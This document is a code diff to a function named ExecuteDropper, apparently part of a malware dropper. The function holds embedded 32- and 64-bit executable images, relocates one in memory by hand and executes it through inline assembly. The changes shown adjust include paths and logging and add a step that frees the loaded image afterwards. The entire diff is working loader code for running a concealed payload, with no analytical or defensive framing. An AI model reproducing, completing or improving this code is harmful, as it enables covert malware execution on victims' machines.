@@ -16,7 +16,7 @@
     #endif
 
     DWORD DropperImageExportAddress32[] = {
-        #include "image32.h"
+        #include "bin\image32.h"
     };
 
     BYTE DropperImageReloc32[] = { MODULE_BASERELOC };
@@ -45,7 +45,7 @@
     #endif
 
     DWORD DropperImageExportAddress64[] = {
-        #include "image64.h"
+        #include "bin\image64.h"
     };
 
     BYTE DropperImageReloc64[] = { MODULE_BASERELOC };
@@ -115,7 +115,7 @@ ExecuteDropper(VOID)
     PIMAGE_BASE_RELOCATION BaseReloc = (PVOID)ImageReloc;
 
     while (BaseReloc->SizeOfBlock) {
-        $DLOG2(DLG_FLT_DEFAULT,  "% 8lX RVA % 8lX SizeOfBlock", BaseReloc->VirtualAddress, BaseReloc->SizeOfBlock);
+        $DLOG3(DLG_FLT_DEFAULT,  "% 8lX RVA % 8lX SizeOfBlock", BaseReloc->VirtualAddress, BaseReloc->SizeOfBlock);
 
         PWORD dwRelocArray = (PVOID)((ULONG_PTR)BaseReloc + sizeof(IMAGE_BASE_RELOCATION));
         ULONG NumberOfWords = (BaseReloc->SizeOfBlock  - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
@@ -135,13 +135,13 @@ ExecuteDropper(VOID)
             #endif
                 PULONG64_PTR dwPointer = (PVOID)((ULONG_PTR)Module + BaseReloc->VirtualAddress + dwRelocRva);
 
-                $DLOG3(DLG_FLT_DEFAULT,  "    % 8X %X %016I64X -> %016I64X", dwRelocRva, dwRelocType, *dwPointer, *dwPointer + (ULONG64_PTR)Module);
+                $DLOG3(DLG_FLT_DEFAULT, "\t% 8X %X %016I64X -> %016I64X", dwRelocRva, dwRelocType, *dwPointer, *dwPointer + (ULONG64_PTR)Module);
 
                 *dwPointer += (ULONG64_PTR)Module;
             } else {
                 PULONG32_PTR dwPointer = (PVOID)((ULONG_PTR)Module + BaseReloc->VirtualAddress + dwRelocRva);
 
-                $DLOG3(DLG_FLT_DEFAULT,  "    % 8X %X %08lX -> %08lX", dwRelocRva, dwRelocType, *dwPointer, *dwPointer + (ULONG32_PTR)Module);
+                $DLOG3(DLG_FLT_DEFAULT, "\t% 8X %X %08lX -> %08lX", dwRelocRva, dwRelocType, *dwPointer, *dwPointer + (ULONG32_PTR)Module);
 
                 *dwPointer += (ULONG32_PTR)Module;
             }
@@ -171,6 +171,14 @@ ExecuteDropper(VOID)
             call dword ptr [Address]
         }
     }
+
+    {
+        SIZE_T dwRegionSize = 0;
+
+        if (NT_ERROR(NtFreeVirtualMemory(NtCurrentProcess(), &Module, &dwRegionSize, MEM_RELEASE))) {
+            $DLOG3(DLG_FLT_ERROR, "Failed to free module image");
+        }
+    };
 
     $DLOG2(DLG_FLT_INFO, "Done");
 
